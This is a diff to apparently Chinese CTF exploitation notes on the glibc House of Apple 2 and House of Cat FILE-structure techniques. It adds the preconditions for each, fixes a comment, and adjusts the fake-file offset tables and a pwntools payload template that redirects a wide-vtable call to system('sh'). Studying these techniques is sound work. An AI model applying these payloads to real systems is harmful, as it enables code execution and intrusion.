@@ -922,6 +922,16 @@ House of Apple 2 的原理：
 4. `_IO_wfile_overflow` 调用 `_IO_WDOALLOCATE`
 5. 通过设置 `fake_file->file._wide_data->_wide_vtable->__doallocate` 为 `system`，使得 `__IO_WDOALLOCATE` 实际上调用的是 `system`
 
+需要满足的条件：
+
+1. `(_flags & 0x080a) == 0`
+2. `(mode <= 0 && _IO_write_ptr > _IO_write_base) || (mode > 0 && _wide_data->_IO_write_ptr > _wide_data->_IO_write_base)`
+3. `_wide_data->_IO_write_base == 0`
+4. `_wide_data->_IO_buf_base == 0`
+5. `_lock` 指向合法的锁
+6. `vtable == _IO_wfile_jumps`
+7. `_wide_data->_wide_vtable->__doallocate == system`
+
 pwntools 模板：
 
 ```python
@@ -964,7 +974,7 @@ payload = flat(
 )
 
 # version 2
-# point fake_file->vtable to fake_file - 0x10 to avoid overflow
+# point fake_file->_wide_data to fake_file - 0x10 to avoid overflow
 payload = flat(
     {
         # fake_file->file._flags
@@ -1013,11 +1023,20 @@ House of Cat 是另一种控制流劫持的方法，它的原理是：
 5. `_IO_switch_to_wget_mode` 调用 `_IO_WOVERFLOW`
 6. 通过设置 `fake_file->file._wide_data->_wide_vtable->__overflow` 为 `system`，使得 `__IO_WOVERFLOW` 实际上调用的是 `system`
 
+需要满足的条件：
+
+1. `(mode <= 0 && _IO_write_ptr > _IO_write_base) || (mode > 0 && _wide_data->_IO_write_ptr > _wide_data->_IO_write_base)`
+2. `_wide_data->_IO_write_ptr > _wide_data->_IO_write_base`
+3. `_wide_data->_IO_write_base != 0` 对于低版本 glibc
+4. `_lock` 指向合法的锁
+5. `vtable == _IO_wfile_jumps + 0x30`
+6. `_wide_data->_wide_vtable->__overflow == system`
+
 House of cat 原版：
 
 - offset 0x00: `fake_file->file._flags = "sh";`
-- offset 0x48: `fake_file->file._wide_data->_IO_write_base = 0;`
-- offset 0x50: `fake_file->file._wide_data->_IO_write_ptr = 1;`
+- offset 0x48: `fake_file->file._wide_data->_IO_write_base = 1;`
+- offset 0x50: `fake_file->file._wide_data->_IO_write_ptr = 2;`
 - offset 0x58: `fake_file->file._wide_data->_wide_vtable->__overflow = system;`
 - offset 0x88: `fake_file->file._lock = _IO_stdfile_0_lock;`
 - offset 0xa0: `fake_file->file._wide_data = fake_file + 0x30;`
@@ -1028,8 +1047,8 @@ House of cat 原版：
 避免溢出的版本，把 _wide_data 挪到 fake_file - 0x10：
 
 - offset 0x00: `fake_file->file._flags = "sh";`
-- offset 0x08: `fake_file->file._wide_data->_IO_write_base = 0;`
-- offset 0x10: `fake_file->file._wide_data->_IO_write_ptr = 1;`
+- offset 0x08: `fake_file->file._wide_data->_IO_write_base = 1;`
+- offset 0x10: `fake_file->file._wide_data->_IO_write_ptr = 2;`
 - offset 0x58: `fake_file->file._wide_data->_wide_vtable->__overflow = system;`
 - offset 0x88: `fake_file->file._lock = _IO_stdfile_0_lock;`
 - offset 0xa0: `fake_file->file._wide_data = fake_file - 0x10;`
@@ -1045,9 +1064,9 @@ payload = flat(
         # fake_file->file._flags
         0x00: b"sh\x00",
         # fake_file->file._wide_data->_IO_write_base
-        0x08: p64(0),
+        0x08: p64(1),
         # fake_file->file._wide_data->_IO_write_ptr
-        0x10: p64(1),
+        0x10: p64(2),
         # fake_file->file._wide_data->_wide_vtable->__overflow
         0x58: p64(libc.symbols["system"]),
         # fake_file->file._lock
